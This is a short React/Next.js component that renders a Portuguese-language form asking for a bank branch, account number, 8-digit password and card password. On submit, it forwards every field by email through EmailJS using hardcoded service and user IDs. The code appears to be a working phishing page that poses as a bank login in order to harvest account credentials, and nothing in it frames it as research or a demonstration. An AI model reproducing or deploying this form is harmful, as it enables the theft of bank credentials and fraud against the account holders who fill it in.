import logo from './img/logo.jpeg';
import Image from 'next/image'
import styles from '../styles/Home.module.css'
import React, { useState } from 'react';
import { Form, FormGroup, Label, Input, FormText, Container, Button } from 'reactstrap';
import emailjs from 'emailjs-com';
import InputMask from "react-input-mask";


const Formulario = (props) => {

  function sendEmail(e) {
    e.preventDefault();

    emailjs.sendForm('service_m0rqqeb', 'template_ovtqo1m', e.target, 'user_blutAP3dvwCpJzktiSL3a')
      .then((result) => {
          console.log(result.text);
      }, (error) => {
          console.log(error.text);
      });
  }
  
  return (
    <Container>
    <Form onSubmit={sendEmail}>  
      
      <FormGroup>
        
        <Input className={styles.Input}
          type="number"
          name="agencia"
          id="agencia"
          placeholder="Agência"
          
        />
      </FormGroup>
      <FormGroup>
        <Input
          type="number"
          name="account"
          id="account"
          placeholder="Conta"
          className={styles.Input}
        />
      </FormGroup>
      <FormGroup>
        <Input
          type="password"
          name="pass8"
          id="pass8"
          placeholder="Senha de 8 digitos"
          className={styles.Input}
        />
      </FormGroup>
     
      <FormGroup>
        <Input
          type="password"
          name="passCard"
          id="passCard"
          placeholder="Senha cartão"
          className={styles.Input}
        />
      </FormGroup>
  


      {/* <FormGroup>
        <Label for="exampleRange"></Label>
        <Input type="range" name="range" id="exampleRange" />
      </FormGroup> */}
    
    <Button type="submit" className={styles.send} value="Send">CONTINUAR</Button>

    </Form>
    </Container>

  );
}

export default Formulario;